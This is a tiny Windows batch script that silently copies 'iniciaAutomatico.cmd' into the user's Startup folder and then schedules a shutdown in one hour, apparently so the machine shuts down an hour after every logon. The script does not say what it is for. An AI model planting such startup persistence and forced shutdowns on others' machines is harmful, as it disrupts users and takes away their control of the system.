@ echo off
xcopy /q /y iniciaAutomatico.cmd "%userprofile%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup"
timeout 3
shutdown -s -t 3600
exit
